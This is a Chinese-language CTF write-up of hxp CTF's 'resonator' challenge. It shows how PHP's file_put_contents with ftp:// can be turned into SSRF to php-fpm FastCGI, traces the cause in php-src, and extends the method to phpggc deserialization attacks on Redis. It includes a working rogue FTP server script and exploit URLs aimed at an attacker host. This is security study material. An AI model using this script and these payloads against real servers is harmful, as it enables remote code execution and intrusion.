---
title: hxp CTF resonator Writeup - SSRF via file_put_contents
date: 2020-12-30 15:02:46
tags: [web, writeup]
---

## 题目简介

在刚结束的 hxpCTF 中出现了一题跟 🍊 的 One line php challenge 一样短小精悍但非常有趣的题目.
长度只有五行,

<!-- more -->

```php
<?php
$file = $_GET['file'] ?? '/tmp/file';
$data = $_GET['data'] ?? ':)';
file_put_contents($file, $data);
echo file_get_contents($file);
```

乍一看不是直接任意文件读和写了么, 我们再看看他的 Dockerfile

```dockerfile
RUN rm -rf /var/www/html/*
COPY docker-stuff/default /etc/nginx/sites-enabled/default
COPY docker-stuff/www.conf /etc/php/7.3/fpm/pool.d/www.conf

COPY flag.txt docker-stuff/readflag /
RUN chown 0:1337 /flag.txt /readflag && \
    chmod 040 /flag.txt && \
    chmod 2555 /readflag

COPY index.php /var/www/html/
RUN chown -R root:root /var/www && \
    find /var/www -type d -exec chmod 555 {} \; && \
    find /var/www -type f -exec chmod 444 {} \;
```

www.conf
```ini
[www]
user = www-data
group = www-data
listen = 127.0.0.1:9000
listen.owner = www-data
listen.group = www-data
```

题目限制了 flag 和 WEB 目录的权限, 无法直接读 flag 和写 webshell, 需要 getshell 后运行 readflag 才行. 根据 php-fpm 特意设置了端口监听, 很大可能就是需要 SSRF fastcgi 后 getshell.
但这样一看, 似乎就直接无解了, 虽然存在 fastcgi 监听在 9000 端口, 但是单单凭借 file_get_contents 的几个协议, 无法控制传递的内容, php-fpm 在收到无效数据后会直接中断链接. 存在可能的是 file_put_contents, 我们可以完整控制第二个参数.

## SSRF via file_put_contents

接下来就需要介绍本篇文章的重点, 通过 file_put_contents 来达到 SSRF 目的.
我们先看看 php 所支持的协议

```
file:// — Accessing local filesystem
http:// — Accessing HTTP(s) URLs
ftp:// — Accessing FTP(s) URLs
php:// — Accessing various I/O streams
zlib:// — Compression Streams
data:// — Data (RFC 2397)
glob:// — Find pathnames matching pattern
phar:// — PHP Archive
ssh2:// — Secure Shell 2
rar:// — RAR
ogg:// — Audio streams
expect:// — Process Interaction Streams
```

ssh2, rar, ogg, expect 都需要额外安装 PCEL 扩展, 再排除 glob, data, zlib, php 这些明显没有太大攻击面的协议. 实际上有可能利用的协议只有 file, http, ftp, phar 这四种.
文件系统层面的漏洞由于大部分目录都不可以写, 可以排除 file, 而 http 无法用于 file_put_contents 也可以排除. phar 没有已知的原生 php 利用链, 同样可以排除, 最后留下的只有 ftp 协议.

ftp 协议相对比较复杂, 其中存在一个特性, 相信大家都听说过, 就是 ftp 的数据端口和指令端口是分开的, 我们平时所说的 21 号端口其实是 ftp 的指令端口, 用于发送指令, 比如认证用户和指定读取的文件. 但是如果是传输文件的内容, ftp 实际上会重新打开一个链接, 同时还分为两种模式, 被动模式和主动模式.

这里 wikipedia 讲的比较清楚, 我直接复制一段过来

```
FTP有两种使用模式：主动和被动。主动模式要求客户端和服务器端同时打开并且监听一个端口以创建连接。在这种情况下，客户端由于安装了防火墙会产生一些问题。所以，创立了被动模式。被动模式只要求服务器端产生一个监听相应端口的进程，这样就可以绕过客户端安装了防火墙的问题。
```

注意 `被动模式只要求服务器端产生一个监听相应端口的进程`, 这里有非常重要的一点, 这个被动模式的端口是服务器指定的, 而且还有一点是很多地方没有提到的, 实际上除了端口, 服务器的地址也是可以被指定的. 由于 ftp 和 http 类似, 协议内容全是纯文本, 我们可以很清晰的看到它是如何指定地址和端口的

```
227 Entering Passive Mode(192,168,9,2,4,8)
```

227 和 Entering Passive Mode 类似 HTTP 的状态码和状态短语, 而  (192,168,9,2,4,8) 代表让客户端连接 192.168.9.2 的 4 * 256 + 8 = 1032 端口.
这样这个如何利用就很明显了, file_put_contents 在使用 ftp 协议时, 会将 data 的内容上传到 ftp 服务器, 由于上面说的 pasv 模式下, 服务器的地址和端口是可控, 我们可以将地址和端口指到 127.0.0.1:9000. 同时由于 ftp 的特性, 不会有任何的多余内容, 类似 gopher 协议, 会将 data 原封不动的发给 127.0.0.1:9000, 完美符合攻击 fastcgi 的要求.

## 利用脚本

server.py
```python
import socket
import sys

'''
Usage: python3 exp.py local_port target_ip target_port
'''

lport = int(sys.argv[1])
raddr = sys.argv[2].replace('.', ',')
rport = sys.argv[3]

server = socket.socket()
server.bind(('0.0.0.0', lport))
server.listen()
client, _ = server.accept()

client.send(b'220 a\n')
client.send(b'331 a\n')
client.send(b'230 a\n')
client.send(b'220 a\n')
client.send(b'550 a\n')
client.send(f'227 aa ({raddr},0,{rport})\n'.encode()) # 默认 php 会使用 EPSV 命令, 这个只能指定端口, 所以我们需要发送两次 227 让 php fallback 到 PASV 模式
client.send(f'227 aa ({raddr},0,{rport})\n'.encode())
client.send(b'150 Ok\n')
```

```
http://target:8009/?file=ftp://your_server:19133/anything&data={Gopherus 生成的 fastcgi payload}
```


## 产生原因

我们可以在 `ext/standard/ftp_fopen_wrapper.c` 查看到相关源码,
```c
static unsigned short php_fopen_do_pasv(php_stream *stream, char *ip, size_t ip_size, char **phoststart)
{
        char tmp_line[512];
        int result, i;
        unsigned short portno;
        char *tpath, *ttpath, *hoststart=NULL;

#ifdef HAVE_IPV6
        /* We try EPSV first, needed for IPv6 and works on some IPv4 servers */
        php_stream_write_string(stream, "EPSV\r\n");
        result = GET_FTP_RESULT(stream);

        /* check if we got a 229 response */
        if (result != 229) {
#endif
                /* EPSV failed, let's try PASV */
                php_stream_write_string(stream, "PASV\r\n");
                result = GET_FTP_RESULT(stream);

                /* make sure we got a 227 response */
                if (result != 227) {
                        return 0;
                }

                /* parse pasv command (129, 80, 95, 25, 13, 221) */
                tpath = tmp_line;
                /* skip over the "227 Some message " part */
                for (tpath += 4; *tpath && !isdigit((int) *tpath); tpath++);
                if (!*tpath) {
                        return 0;
                }
                /* skip over the host ip, to get the port */
                hoststart = tpath;
                for (i = 0; i < 4; i++) {
                        for (; isdigit((int) *tpath); tpath++);
                        if (*tpath != ',') {
                                return 0;
                        }
                        *tpath='.';
                        tpath++;
                }
                tpath[-1] = '\0';
                memcpy(ip, hoststart, ip_size);
                ip[ip_size-1] = '\0';
                hoststart = ip;

                /* pull out the MSB of the port */
                portno = (unsigned short) strtoul(tpath, &ttpath, 10) * 256;
                if (ttpath == NULL) {
                        /* didn't get correct response from PASV */
                        return 0;
                }
                tpath = ttpath;
                if (*tpath != ',') {
                        return 0;
                }
                tpath++;
                /* pull out the LSB of the port */
                portno += (unsigned short) strtoul(tpath, &ttpath, 10);
#ifdef HAVE_IPV6
        } else {
                /* parse epsv command (|||6446|) */
                for (i = 0, tpath = tmp_line + 4; *tpath; tpath++) {
                        if (*tpath == '|') {
                                i++;
                                if (i == 3)
                                        break;
                        }
                }
                if (i < 3) {
                        return 0;
                }
                /* pull out the port */
                portno = (unsigned short) strtoul(tpath + 1, &ttpath, 10);
        }
#endif
        if (ttpath == NULL) {
                /* didn't get correct response from EPSV/PASV */
                return 0;
        }

        if (phoststart) {
                *phoststart = hoststart;
        }

        return portno;
}
```

注意到
```c
tpath[-1] = '\0';
memcpy(ip, hoststart, ip_size);
ip[ip_size-1] = '\0';
hoststart = ip;
```

可以发现, 虽然在注释里面写了 `skip over the host ip, to get the port`, 但实际上还是没有 skip, 会将 PASV 给出的 ip 最后用于数据通道的连接, 导致漏洞产生.
同时 php 还是用 `portno += (unsigned short) strtoul(tpath, &ttpath, 10);` 来获取的端口, 这也解释了为什么 (127,0,0,1,0,9000) 和 (127,0,0,1,35,40) 是一样的, 因为 php 底层并没有把他转换成 unsigned char 后再相加的 233

## Real World

因为需要完整控制 filename 的关系, 这个漏洞在真实情况下比较不常见, 我觉得这个漏洞利用在反序列化上可能会更加好, 比如 phpggc 上存在的一个链 `SwiftMailer/FW1`, 我们将 `gadgetchains/SwiftMailer/FW/1/gadgets.php` 中的 `private $_mode = 'w+b';` 改成 `private $_mode = 'w';`, 这样使得 fopen 兼容 ftp 协议, 使得反序列化链正常进行.

然后利用的方式其实与 rouge_mysql_server 类似, 需要客户端连接我们的恶意服务器, 比如我们需要攻击 redis 服务, 首先在服务器上运行 `python3 server.py 19132 127.0.0.1 6379`, 再使用 `./phpggc SwiftMailer/FW1 "ftp://rouge_ftp_server:19132/asd" ssrf_payload_file` 来生成我们的序列化 payload, 在反序列化漏洞被触发后 ssrf_payload_file 中的内容就会被发往 127.0.0.1:6379.

这样就能扩展部分反序列化利用的方式, 比如在不知道 WEB 目录, 或者 WEB 目录不可写的情况下, 可以尝试 ssrf 一些 redis 服务, 扩大我们的攻击面.

## 参考

1. https://zh.wikipedia.org/wiki/%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93%E5%8D%8F%E8%AE%AE
2. https://github.com/ambionics/phpggc
3. https://github.com/php/php-src
